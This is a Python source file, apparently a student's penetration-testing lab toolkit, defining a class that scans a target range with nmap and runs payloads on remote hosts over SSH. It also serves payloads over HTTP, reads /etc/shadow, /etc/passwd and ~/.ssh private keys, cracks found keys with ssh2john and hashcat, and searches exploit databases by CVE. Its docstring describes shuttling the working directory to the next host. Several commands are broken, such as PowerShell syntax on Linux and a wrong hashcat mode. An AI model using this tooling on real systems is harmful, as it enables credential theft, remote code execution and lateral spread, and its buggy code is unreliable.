from os import name
from xmlrpc import client

from pyexploitdb import PyExploitDb 
import re
import socket
from computerspeak import ComputerSpeak as cs
from pathlib import Path
import nmap
from target_config import IPV4_RE, TARGET_INTERFACE, TARGET_IP, TARGET_PASSWORD, TARGET_USERNAME, TARGET_RANGE

import time

import paramiko


class CoreClass:
    """CoreClass is responsible for various operations such as file handling, network scanning, and vulnerability assessment. Its generally where I bring out the big guns for the lab exercises, and it also contains the main logic for zipping the current working directory and shuttling it to the next host."""
    def __init__(self):
        csi=cs()

    def iter_nmap_lines(self, path=None):
        if path is None:
            path = Path(__file__).resolve().parents[1] / "nmap_results.txt"
        with open(path, "r", encoding="utf-8", errors="replace") as f:
            for line in f:
                yield line.rstrip("\n")

    @staticmethod
    def ssh_payload(host, username, password=None, payload=None):
        """Execute a payload on a remote host via SSH. This function detects the target OS and executes the payload accordingly, ensuring compatibility with both Windows and Linux systems."""
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, username=username, password=password)

        def run(cmd):
            stdin, stdout, stderr = client.exec_command(cmd)
            return stdout.read().decode().strip(), stderr.read().decode().strip()

        # 1. Detect OS using whoami output
        who, _ = run("whoami")

        # Windows OpenSSH returns:  HOSTNAME\username
        # Linux returns:             username
        if "\\" in who:
            os_type = "windows"
        else:
            os_type = "linux"

        results = {"os": os_type, "whoami": who}

        # 2. Branch based on OS
        if os_type == "windows":
            results["cmd1"] = run("touch afile.sh")[0]
            results["cmd2"] = run(f"Write-Output'{payload} | tee afile.sh")[0]
            results["cmd3"] = run("powershell -ExecutionPolicy Bypass -File afile.sh")[0]
            results["cmd4"] = run("./afile.sh")[0]
            results["cmd5"] = run("powershell Remove-Item -Path afile.sh")[0]
        else:  # linux
            results["cmd1"] = run("touch afile.sh")[0]
            results["cmd2"] = run(f"Write-Output '{payload}' | tee afile.sh")[0]
            results["cmd3"] = run("chmod +x afile.sh")[0]
            results["cmd4"] = run("./afile.sh")[0]
            results["cmd5"] = run("rm -f afile.sh")[0]
        client.close()
        csi=cs()
        csi.execute_command(f"Write-Output '{results}'")

        return results


    @staticmethod
    def web_payload(host, port, payload=None):
        """Serve a payload over HTTP on the specified host and port, remember this needs a thread to continue running in the background, and it also needs to be called from the main function so it doesn't just end immediately. :D"""
        import http.server
        import socketserver
        import threading

        class Handler(http.server.SimpleHTTPRequestHandler):
            def do_GET(self):
                self.send_response(200)
                self.send_header("Content-type", "text/plain")
                self.end_headers()
                self.wfile.write(payload.encode())

        with socketserver.TCPServer((host, port), Handler) as httpd:
            print(f"Serving payload on {host}:{port}")
            thread = threading.Thread(target=httpd.serve_forever)
            thread.daemon = True
            thread.start()
            return httpd, thread

    @staticmethod
    def check_rdp_connection():
        """Check if RDP connection to the target host is successful. This function attempts to establish a socket connection to the target IP on the default RDP port (3389) and returns True if successful, or False if the connection fails. It also includes error handling to catch and report any socket errors or unexpected exceptions that may occur during the connection attempt."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)  # Set a timeout for the connection attempt
            result = sock.connect_ex((TARGET_IP, 3389))  # RDP typically uses port 3389. its also my favorite port :D, the very first one i memorized weirdly enough.
            sock.close()
            if result == 0:
                return True
            else:
                print(f"RDP connection failed with error code: {result}")
                return False
        except socket.error as e:
            print(f"Socket error occurred: {e}")
            return False
        except Exception as e:
            print(f"An unexpected error occurred: {e}")
            return False


        
    @staticmethod
    def check_ssh_connection():
        """Check if SSH connection to the target host is successful. This function uses the Paramiko library to attempt an SSH connection to the target IP using the provided username and password. It returns True if the connection is successful, or False if it fails. The function includes error handling to catch and report any SSH exceptions, socket errors, or unexpected exceptions that may occur during the connection attempt."""
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh_client.connect(hostname=TARGET_IP, username=TARGET_USERNAME, password=TARGET_PASSWORD, look_for_keys=True, allow_agent=False)#be sure to update this each foothold. 
            transport = ssh_client.get_transport()
            if transport and transport.is_active():
                return True
        except (paramiko.PasswordRequiredException):
            try:
                ssh_client.connect(hostname=TARGET_IP, username=TARGET_USERNAME, password=TARGET_USERNAME, look_for_keys=True, allow_agent=False)
                transport = ssh_client.get_transport()
                ssh_client.close()
            except Exception as e:
                print(f"hashcat and johnny can't cut it bud {e}")      
        except (paramiko.SSHException, socket.error) as e:
            print(f"SSH connection failed: {e}")
        except Exception as e:
            print(f"An unexpected error occurred: {e}")
        finally:
            ssh_client.close()
        return False
    @staticmethod
    def _extract_hosts_from_nmap(output):
        """Extract hosts from Nmap scan output."""
        hosts = []
        seen = set()
        for line in output.splitlines():
            if "Nmap scan report for" not in line: #this doesn't work tho. 
                continue
            match = IPV4_RE.search(line)
            if not match:
                continue
            host = match.group(0)
            if host not in seen:
                seen.add(host)
                hosts.append(host)
        return hosts
#k im confused. it says in the lab to do a full port scan, but it doesn't show on nmap 
    def file_snoop(self): 
        """This function checks for sensitive files in the /etc directory and the user's home .ssh directory, and attempts to read their contents. It logs the findings using the ComputerSpeak class and returns the contents of any sensitive files found. The function is designed to handle both Linux and Windows systems, and it gracefully handles any errors that may occur during file access."""
        cs_i = cs()
        home = str(Path.home())
        etc = []
        etc = cs_i.execute_command(f"cd /etc && ls -la")
        for line in etc.splitlines():
            if line and not line.startswith("drwx"):
                line = line.split()[-1]
                if line in ["shadow", "passwd"]:
                    cs_i.execute_command(f"Write-Output 'Found {line} in /etc!'")
                    content = cs_i.execute_command(f"cat /etc/{line}")
                    cs_i.execute_command(f"Write-Output 'Contents of /etc/{line}:'")
                    cs_i.execute_command(f"Write-Output '{content}'")
                    return content
                elif line in ["ssh", "ssh_config"]:
                    cs_i.execute_command(f"Write-Output 'Found {line} in /etc!'")
                    content = cs_i.execute_command(f"cat /etc/{line}")  # this one specifically is apparently on career sim 2
                    cs_i.execute_command(f"Write-Output 'Contents of /etc/{line}:'")
                    cs_i.execute_command(f"Write-Output '{content}'")
                    return content
        ssh_dir = Path(home) / ".ssh"
        if ssh_dir.exists():
            cs_i.execute_command(f"Write-Output 'Found .ssh directory in home!'")
            ssh_files = cs_i.execute_command(f"ls -la {ssh_dir}")
            for line in ssh_files.splitlines():
                if line and not line.startswith("drwx"):
                    file_name = line.split()[-1]
                    cs_i.execute_command(f"Write-Output 'Found SSH file: {file_name}'")
                    sshcontent = cs_i.execute_command(f"cat {ssh_dir}/{file_name}")
                    cs_i.execute_command(f"Write-Output 'Contents of {ssh_dir}/{file_name}:'")
                    cs_i.execute_command(f"Write-Output '{sshcontent}'")
                    return sshcontent
                # and it all started with frustration and monty python :D

    def network_knocking(self, name):
        """This function performs a network scan using Nmap to identify active hosts in the target range, and then attempts to knock on specific ports to check if they are open or filtered. The results of the scan and knock attempts are logged using the ComputerSpeak class, and the function handles any exceptions that may occur during the process. The function is designed to provide insights into the network's active hosts and their open ports, which can be useful for further enumeration and exploitation activities."""
        cs_i = cs()
        cs_i.execute_command("Write-Output 'Starting network scan...'")
        hitlist = cs_i.execute_command(f"nmap  -A -sS {TARGET_RANGE} -oN nmap_results.txt")
        active_hosts = self._extract_hosts_from_nmap(hitlist)
        return active_hosts

    def check_for_mental_illness(self, name=name):  
        """Check for SSH configuration files and return their paths. If found, attempt to read their contents and use them for further analysis. This function looks for common SSH configuration files in the user's home directory, logs the findings using the ComputerSpeak class, and returns a list of paths to any SSH configuration files found. If no files are found, it logs that information as well. It also can be a good indicator of a new attack vector, or confirmation we can tailscale it if all we see is the same ssh config file on each host. :D""" #speaking of... we can also use this to check for tailscale configs and then use that to pivot to the next host if we find it. :D it can also show attack vectors nmap doesn't show us. 
        mentalillness = []
        yourname = Path.home()  # favorite functino so far.
        thelooneybin = [
            yourname / ".ssh" / "config",
            yourname / ".ssh" / "id_rsa",
            yourname / ".ssh" / "id_rsa.pub",
            yourname / ".ssh" / "known_hosts",
        ]
        for path in thelooneybin:
            if path.exists(): 
                mentalillness.append(str(path))
                return mentalillness
        if not mentalillness:
            cs_i = cs()
            cs_i.execute_command("Write-Output 'No SSH configuration files found.'")
        if mentalillness:
            cs_i = cs()
            cs_i.execute_command(f"Write-Output 'SSH configuration files found: {mentalillness}'")
            for file in mentalillness:
                cs_i.execute_command(f"Write-Output 'Contents of {file}:'")
                with open(file, 'r') as f:
                    sshgoodies = f.read() #please note this side of the function needs more work. we need to parse the ssh config file for any useful information, and then we can use that information to attempt to connect to other hosts or crack any private keys we find. :D
                    for i in sshgoodies.splitlines():
                        if i in sshgoodies.splitlines() != "":
                            cs_i.execute_command(f"Write-Output '{i}'")
                            cs_i.execute_command(f"Write-Output 'Attempting to crack SSH configuration file: {file}'")
                            heresjohnny = cs_i.execute_command(f"ssh2john {file} --format=ssh > {file}.hash")
                        for hash in heresjohnny.splitlines():
                            # so now we bring in hashcat right?
                            hellcat = cs_i.execute_command(f"hashcat -m 0 {file}.hash /SurzsEnviro/SecLists-2025.3/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt --force")
                            if hellcat is not None:
                                cs_i.execute_command(f"Write-Output 'Hashcat results for {file}:'")
                                cs_i.execute_command(f"Write-Output '{hellcat}'")
                            else:
                                cs_i.execute_command(f"Write-Output 'Hashcat did not return any results for {file}.'")
                            print(f"Hashcat results for {file}:\n{hellcat}")
                    theresults = cs_i.execute_command(f"cat {file}")
                    print(f"Contents of {file}:\n{theresults}")
        else:
            cs_i = cs()
            cs_i.execute_command("Write-Output 'No SSH configuration files found.'")
        print("Mental illness check complete." + str(mentalillness) if mentalillness else "No SSH configuration files found.")
        return mentalillness
    
    def _build_payload(self, selected):
        pass



    def exploitdbforvuln(name = name):
        """This function reads vulnerability scan results from text files, extracts CVE identifiers, and uses SearchSploit to find related exploits. The results are then printed and saved to separate text files. This function is designed to automate the process of correlating vulnerability scan results with known exploits, providing valuable insights for further exploitation activities. It handles any exceptions that may occur during file reading or command execution, and it logs the findings using the ComputerSpeak class."""
        cs_i = cs()
        vuln_files = list(Path("SurzsEnviro/SurzalsNotes/SurzalsTexts/SurzalsVulns").glob("vuln_scan_*.txt"))
        for vuln_file in vuln_files:
            with open(vuln_file, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
                cve_matches = re.findall(r"CVE-\d{4}-\d{4,7}", content)
                if cve_matches:
                    for cve in set(cve_matches):
                        cs_i.execute_command(f"Write-Output 'Searching for exploits related to {cve}...'")
                        exploit_results = cs_i.execute_command(f"searchsploit {cve} --json")
                        if exploit_results:
                            cs_i.execute_command(f"Write-Output 'Exploit search results for {cve}:'")
                            cs_i.execute_command(f"Write-Output '{exploit_results}'")
                            with open(f"SurzsEnviro/SurzalsNotes/SurzalsTexts/SurzalsExploits/exploit_search_{cve}.txt", "w", encoding="utf-8") as exploit_file:
                                exploit_file.write(exploit_results)
                        else:
                            cs_i.execute_command(f"Write-Output 'No exploits found for {cve}.'")
                        print(f"Exploit search results for {cve}:\n{exploit_results}")
                else:
                    cs_i.execute_command(f"Write-Output 'No CVE identifiers found in {vuln_file}.'")
                    print(f"No CVE identifiers found in {vuln_file}.")
                return cve_matches if cve_matches else None #there we go


                                